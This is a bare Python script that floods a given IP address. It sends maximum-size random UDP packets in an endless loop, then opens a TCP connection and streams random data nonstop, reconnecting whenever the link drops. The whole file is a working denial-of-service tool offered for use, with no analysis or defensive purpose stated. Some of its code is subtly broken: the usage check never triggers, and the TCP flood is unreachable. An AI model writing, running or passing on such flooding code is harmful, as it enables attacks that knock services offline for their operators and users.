import socket
import random
import sys
from time import time as tt

ip = str(sys.argv[1])
udpport = int(sys.argv[2])
tcpport = int(sys.argv[3])

if ip is None:
    print("Usage: python3 filename.py ip udpport tcpport")

def UDP(ip, udpport):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 102038)
    s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, 20)
    s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 1)
    data = random._urandom(65507)
    addr = (str(ip),int(udpport))
    while True:
        s.sendto(data, addr)

def TCP(ip, tcpport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, True)
    s.setsockopt(socket.SOL_SOCKET, socket.IP_MULTICAST_LOOP, True)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    data = random._urandom(65507)
    target = (str(ip), int(tcpport))
    s.connect(target)
    while True:
        try:
            s.sendall(data)
        except BrokenPipeError:
            TCP(ip, tcpport)
        except ConnectionResetError:
            TCP(ip, tcpport)
        except ConnectionError:
            TCP(ip, tcpport)

UDP(ip, udpport)
TCP(ip, tcpport)